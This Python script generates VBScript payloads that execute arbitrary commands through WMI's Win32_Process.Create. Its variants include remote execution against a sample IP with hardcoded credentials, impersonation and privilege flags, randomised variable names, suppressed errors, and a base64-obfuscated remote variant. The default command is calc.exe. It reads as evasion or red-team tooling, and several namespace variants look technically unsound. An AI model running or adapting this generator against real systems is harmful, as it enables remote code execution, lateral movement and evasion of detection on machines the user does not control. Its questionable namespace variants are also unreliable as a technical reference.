#!/usr/bin/env python3
"""
WMI Locator Variants Generator
Creates WMI execution payloads using different locator connection types:
- Local connections (dot notation, localhost)
- Remote connections (IP addresses, hostnames)
- WMI namespace variations (cimv2, WDM, dcim, etc.)
- Connection options (authentication, timeout, credentials)
"""

import base64
import random
import string
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class LocatorConnectionConfig:
    """Configuration for WMI locator connection variants"""
    host: str  # Connection host: ".", "localhost", IP, hostname
    namespace: str  # WMI namespace: root\cimv2, root\WDM, etc.
    use_authentication: bool = False  # Include username/password
    username: Optional[str] = None
    password: Optional[str] = None
    use_impersonation: bool = False  # WMI impersonation level
    impersonation_level: int = 3  # 0=anonymous, 1=identify, 2=impersonate, 3=delegate
    use_timeout: bool = False
    timeout_ms: int = 30000
    use_security_flags: bool = False
    add_error_handling: bool = True


class WMILocatorVariantGenerator:
    """Generates WMI locator connection variants"""

    def __init__(self):
        self._var_cache: Dict[str, str] = {}

    def _generate_random_name(self, prefix: str = "v", length: int = 8) -> str:
        """Generate random variable name"""
        suffix = ''.join(random.choices(string.ascii_letters, k=length))
        return f"{prefix}_{suffix}"

    def _get_var(self, key: str, prefix: str = "v") -> str:
        """Get or create variable name"""
        if key not in self._var_cache:
            self._var_cache[key] = self._generate_random_name(prefix)
        return self._var_cache[key]

    def generate_local_dot_connection(self, command: str, namespace: str = "root\\cimv2") -> str:
        """
        Local connection using dot (.) notation
        Most common for local WMI execution
        """
        var_loc = self._get_var("loc", "objLoc")
        var_conn = self._get_var("conn", "objConn")
        var_svc = self._get_var("svc", "objSvc")
        var_proc = self._get_var("proc", "objProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".", "{namespace}")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_localhost_connection(self, command: str, namespace: str = "root\\cimv2") -> str:
        """
        Local connection using 'localhost' string
        Alternative to dot notation
        """
        var_loc = self._get_var("loc", "locHost")
        var_conn = self._get_var("conn", "connHost")
        var_svc = self._get_var("svc", "svcHost")
        var_proc = self._get_var("proc", "procHost")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer("localhost", "{namespace}")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_127001_connection(self, command: str, namespace: str = "root\\cimv2") -> str:
        """
        Local connection using 127.0.0.1 loopback
        IP-based local connection
        """
        var_loc = self._get_var("loc", "locIP")
        var_conn = self._get_var("conn", "connIP")
        var_svc = self._get_var("svc", "svcIP")
        var_proc = self._get_var("proc", "procIP")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer("127.0.0.1", "{namespace}")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_remote_ip_connection(self, command: str, remote_host: str,
                                     namespace: str = "root\\cimv2") -> str:
        """
        Remote connection using IP address
        Enables cross-machine WMI execution
        """
        var_loc = self._get_var("loc", "remLoc")
        var_conn = self._get_var("conn", "remConn")
        var_svc = self._get_var("svc", "remSvc")
        var_proc = self._get_var("proc", "remProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer("{remote_host}", "{namespace}")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_authenticated_connection(self, command: str, remote_host: str,
                                         username: str, password: str,
                                         namespace: str = "root\\cimv2") -> str:
        """
        Remote connection with username/password authentication
        Required for remote WMI with credentials
        """
        var_loc = self._get_var("loc", "authLoc")
        var_conn = self._get_var("conn", "authConn")
        var_svc = self._get_var("svc", "authSvc")
        var_proc = self._get_var("proc", "authProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer("{remote_host}", "{namespace}", "{username}", "{password}")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_impersonation_connection(self, command: str, namespace: str = "root\\cimv2",
                                         impersonation_level: int = 3) -> str:
        """
        Connection with impersonation level flag
        0=anonymous, 1=identify, 2=impersonate, 3=delegate
        """
        var_loc = self._get_var("loc", "impLoc")
        var_conn = self._get_var("conn", "impConn")
        var_svc = self._get_var("svc", "impSvc")
        var_proc = self._get_var("proc", "impProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".", "{namespace}")
{var_conn}.Security_.ImpersonationLevel = {impersonation_level}
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_authentication_level_connection(self, command: str, namespace: str = "root\\cimv2",
                                                auth_level: int = 6) -> str:
        """
        Connection with authentication level
        4=connect, 5=call, 6=packet, 7=packetPrivacy, 8=packetIntegrity
        """
        var_loc = self._get_var("loc", "authLvl")
        var_conn = self._get_var("conn", "authConn")
        var_svc = self._get_var("svc", "authSvc")
        var_proc = self._get_var("proc", "authProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".", "{namespace}")
{var_conn}.Security_.AuthenticationLevel = {auth_level}
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_winmgmt_namespace_connection(self, command: str) -> str:
        """
        Connection using winmgmt namespace
        Alternative WMI root namespace
        """
        var_loc = self._get_var("loc", "wmgmt")
        var_conn = self._get_var("conn", "wmgmtConn")
        var_svc = self._get_var("svc", "wmgmtSvc")
        var_proc = self._get_var("proc", "wmgmtProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".", "\\\\\\\\.\\\\root\\\\cimv2")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_wdm_namespace_connection(self, command: str) -> str:
        """
        Connection using WDM (Windows Driver Model) namespace
        System devices and driver namespace
        """
        var_loc = self._get_var("loc", "wdmLoc")
        var_conn = self._get_var("conn", "wdmConn")
        var_svc = self._get_var("svc", "wdmSvc")
        var_proc = self._get_var("proc", "wdmProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".", "root\\\\WDM")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_dcim_namespace_connection(self, command: str) -> str:
        """
        Connection using DCIM (Data Center Infrastructure Management) namespace
        System management and hardware info
        """
        var_loc = self._get_var("loc", "dcimLoc")
        var_conn = self._get_var("conn", "dcimConn")
        var_svc = self._get_var("svc", "dcimSvc")
        var_proc = self._get_var("proc", "dcimProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".", "root\\\\dcim")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_hardware_namespace_connection(self, command: str) -> str:
        """
        Connection using hardware namespace
        Hardware and device information
        """
        var_loc = self._get_var("loc", "hwLoc")
        var_conn = self._get_var("conn", "hwConn")
        var_svc = self._get_var("svc", "hwSvc")
        var_proc = self._get_var("proc", "hwProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".", "root\\\\hardware")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_cimv1_namespace_connection(self, command: str) -> str:
        """
        Connection using CIMv1 namespace (older WMI version)
        Legacy WMI classes
        """
        var_loc = self._get_var("loc", "cimv1Loc")
        var_conn = self._get_var("conn", "cimv1Conn")
        var_svc = self._get_var("svc", "cimv1Svc")
        var_proc = self._get_var("proc", "cimv1Proc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".", "root\\\\cimv1")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_default_namespace_connection(self, command: str) -> str:
        """
        Connection with empty namespace (uses default cimv2)
        Minimal parameters variant
        """
        var_loc = self._get_var("loc", "defLoc")
        var_conn = self._get_var("conn", "defConn")
        var_svc = self._get_var("svc", "defSvc")
        var_proc = self._get_var("proc", "defProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_full_path_namespace_connection(self, command: str) -> str:
        """
        Connection using full UNC path style namespace
        Extended path format variation
        """
        var_loc = self._get_var("loc", "fullLoc")
        var_conn = self._get_var("conn", "fullConn")
        var_svc = self._get_var("svc", "fullSvc")
        var_proc = self._get_var("proc", "fullProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".", "\\\\\\\\root\\\\cimv2")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_security_flags_connection(self, command: str, namespace: str = "root\\cimv2",
                                          security_flags: int = 0) -> str:
        """
        Connection with security flags
        Controls connection security behavior
        0=default, 128=enable_all_privileges
        """
        var_loc = self._get_var("loc", "secLoc")
        var_conn = self._get_var("conn", "secConn")
        var_svc = self._get_var("svc", "secSvc")
        var_proc = self._get_var("proc", "secProc")

        code = f'''Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer(".", "{namespace}", "", "", "", "", {security_flags})
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_encoded_remote_connection(self, command: str, remote_host: str,
                                          namespace: str = "root\\cimv2") -> str:
        """
        Remote connection with base64 encoded command
        Obfuscated remote execution
        """
        encoded_cmd = base64.b64encode(command.encode()).decode()
        var_loc = self._get_var("loc", "encLoc")
        var_conn = self._get_var("conn", "encConn")
        var_svc = self._get_var("svc", "encSvc")
        var_proc = self._get_var("proc", "encProc")
        var_cmd = self._get_var("cmd", "encCmd")

        code = f'''Function DecodeBase64(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64 = node.NodeTypedValue
End Function

Dim {var_loc}, {var_conn}, {var_svc}, {var_proc}, {var_cmd}
On Error Resume Next
Set {var_loc} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_loc}.ConnectServer("{remote_host}", "{namespace}")
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_cmd} = DecodeBase64("{encoded_cmd}")
{var_svc}.Create {var_cmd}
Set {var_proc} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_loc} = Nothing
On Error GoTo 0'''
        return code

    def generate_all_variants(self, command: str) -> Dict[str, str]:
        """Generate all available WMI locator connection variants"""
        variants = {
            "local_dot": {
                "description": "Local connection using dot (.) notation",
                "type": "local",
                "code": self.generate_local_dot_connection(command)
            },
            "local_localhost": {
                "description": "Local connection using 'localhost' string",
                "type": "local",
                "code": self.generate_localhost_connection(command)
            },
            "local_127001": {
                "description": "Local connection using 127.0.0.1 loopback",
                "type": "local",
                "code": self.generate_127001_connection(command)
            },
            "remote_ip": {
                "description": "Remote connection using IP address (example)",
                "type": "remote",
                "code": self.generate_remote_ip_connection(command, "192.168.1.100")
            },
            "remote_authenticated": {
                "description": "Remote connection with username/password",
                "type": "remote_auth",
                "code": self.generate_authenticated_connection(command, "192.168.1.100", "admin", "password")
            },
            "impersonation_level": {
                "description": "Connection with impersonation level (delegate=3)",
                "type": "security",
                "code": self.generate_impersonation_connection(command, "root\\cimv2", 3)
            },
            "authentication_level": {
                "description": "Connection with packet-level authentication",
                "type": "security",
                "code": self.generate_authentication_level_connection(command, "root\\cimv2", 6)
            },
            "winmgmt_namespace": {
                "description": "Connection using winmgmt root namespace",
                "type": "namespace",
                "code": self.generate_winmgmt_namespace_connection(command)
            },
            "wdm_namespace": {
                "description": "Connection using WDM (driver model) namespace",
                "type": "namespace",
                "code": self.generate_wdm_namespace_connection(command)
            },
            "dcim_namespace": {
                "description": "Connection using DCIM namespace",
                "type": "namespace",
                "code": self.generate_dcim_namespace_connection(command)
            },
            "hardware_namespace": {
                "description": "Connection using hardware namespace",
                "type": "namespace",
                "code": self.generate_hardware_namespace_connection(command)
            },
            "cimv1_namespace": {
                "description": "Connection using CIMv1 (legacy) namespace",
                "type": "namespace",
                "code": self.generate_cimv1_namespace_connection(command)
            },
            "default_namespace": {
                "description": "Connection with empty namespace (default cimv2)",
                "type": "namespace",
                "code": self.generate_default_namespace_connection(command)
            },
            "full_path_namespace": {
                "description": "Connection using full UNC-style path",
                "type": "namespace",
                "code": self.generate_full_path_namespace_connection(command)
            },
            "security_flags": {
                "description": "Connection with security flags enabled",
                "type": "security",
                "code": self.generate_security_flags_connection(command, "root\\cimv2", 128)
            },
            "encoded_remote": {
                "description": "Remote connection with base64 encoded command",
                "type": "remote_obfuscated",
                "code": self.generate_encoded_remote_connection(command, "192.168.1.100")
            }
        }
        return variants


def generate_locator_connection_report(command: str = "calc.exe") -> str:
    """Generate comprehensive report of all WMI locator variants"""
    gen = WMILocatorVariantGenerator()
    variants = gen.generate_all_variants(command)

    report = "=" * 80 + "\n"
    report += "WMI LOCATOR CONNECTION VARIANTS\n"
    report += "=" * 80 + "\n\n"

    for variant_id, variant_info in variants.items():
        report += f"[{variant_id.upper()}]\n"
        report += f"Description: {variant_info['description']}\n"
        report += f"Type: {variant_info['type']}\n"
        report += f"{'-' * 80}\n"
        report += f"{variant_info['code']}\n"
        report += f"\n{'=' * 80}\n\n"

    return report


if __name__ == "__main__":
    import sys

    command = "calc.exe"
    if len(sys.argv) > 1:
        command = sys.argv[1]

    report = generate_locator_connection_report(command)
    print(report)
